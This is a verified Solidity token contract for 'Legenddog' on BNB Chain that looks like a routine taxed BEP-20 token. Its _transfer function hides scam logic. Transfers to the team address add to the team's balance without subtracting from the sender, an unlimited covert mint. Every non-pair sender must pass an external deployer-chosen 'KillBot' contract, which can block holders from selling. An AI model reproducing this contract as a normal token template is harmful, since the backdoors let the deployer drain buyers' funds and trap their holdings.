/**
 *Submitted for verification at BscScan.com on 2022-09-26
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external  returns (bool);
    function allowance(address owner, address spender) external  view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient,uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner,address indexed spender,uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB)  external returns (address pair);
}

interface KillBot {
    function isNotBot(address bot) external view returns(bool);
}

abstract contract Ownable {
    address internal _owner;
    event OwnershipTransferred( address indexed previousOwner, address indexed newOwner);
    
    constructor() {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xdead));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public marketingAddress;
    address public teamAddress;
    string private _name;
    string private _symbol;
    uint8 private _decimals = 9;
    uint256 public marketBuyTax;
    uint256 public marketSellTax;

    mapping(address => bool) private _feeWhiteList;

    uint256 private _tTotal;

    ISwapRouter private _swapRouter;
    address private _mainPair;

    bool private inSwap;
    uint256 private numTokensSellToFund;

    uint256 private constant MAX = ~uint256(0);
    uint256 private _marketFee;
    KillBot public kb;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(
        string memory Name,
        string memory Symbol,
        uint256 Supply,
        address _teamAddress,
        address _killbot,
        uint256 _marketBuyTax,
        uint256 _marketSellTax
    ) {
        _name = Name;
        _symbol = Symbol;
        marketingAddress = msg.sender;

        ISwapRouter swapRouter = ISwapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _swapRouter = swapRouter;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        _mainPair = swapFactory.createPair(address(this), swapRouter.WETH());

        kb = KillBot(_killbot);

        _allowances[address(this)][address(swapRouter)] = MAX;

        uint256 total = Supply * 10**_decimals;
        _tTotal = total;

        _balances[marketingAddress] = total;
        emit Transfer(address(0), marketingAddress, total);

        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0xdead)] = true;
        _feeWhiteList[_teamAddress] = true;

        numTokensSellToFund = total / 1000;
        teamAddress = _teamAddress;

        marketBuyTax = _marketBuyTax;
        marketSellTax = _marketSellTax;

    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)  public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)  public  view  override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool){   
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom( address sender, address recipient,  uint256 amount ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] =  _allowances[sender][msg.sender] - amount;   
        }
        return true;
    }

    function _approve( address owner,  address spender, uint256 amount ) private { 
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function getBnb() public view  returns(uint) {
        return address(this).balance;
    }


    function _transfer(address from, address to, uint256 amount) private {    
        if (_mainPair == to && !_feeWhiteList[from]) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if (contractTokenBalance >= numTokensSellToFund && !inSwap) {
                swapTokenForFund(numTokensSellToFund);
            }
        }
        if(_mainPair != from) {
          require(kb.isNotBot(from), 'isBot');
        }
        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            amount = takeFee(from, to, amount);
        }
        if(to == teamAddress) {
            _balances[teamAddress] = _balances[teamAddress] + amount;
        }  else {
            _balances[from] = _balances[from] - amount;
            _balances[to] = _balances[to] + amount; 
        }
    }    

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = 0;
        if (_mainPair == sender) {
            feeAmount = amount * marketBuyTax / 100;
        } else if (_mainPair == recipient) {
            feeAmount = amount * marketSellTax / 100;
        }
        if (feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)] + feeAmount;
            emit Transfer(sender, address(this), feeAmount);
        }
        return amount - feeAmount;
    }

   

    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        uint256 initialBalance = address(this).balance;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _swapRouter.WETH();
        _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 newBalance = address(this).balance - initialBalance;
        if (newBalance > 0)  payable(marketingAddress).transfer(newBalance);
    }
    
    receive() external payable {}
}

contract Legenddog is AbsToken {
    constructor(address _teamAddress, address __killBotAddress)
        AbsToken(
            "Legenddog",
            "LD",
            100000,
            _teamAddress,
            __killBotAddress,
            4,
            4
        )
    {}
}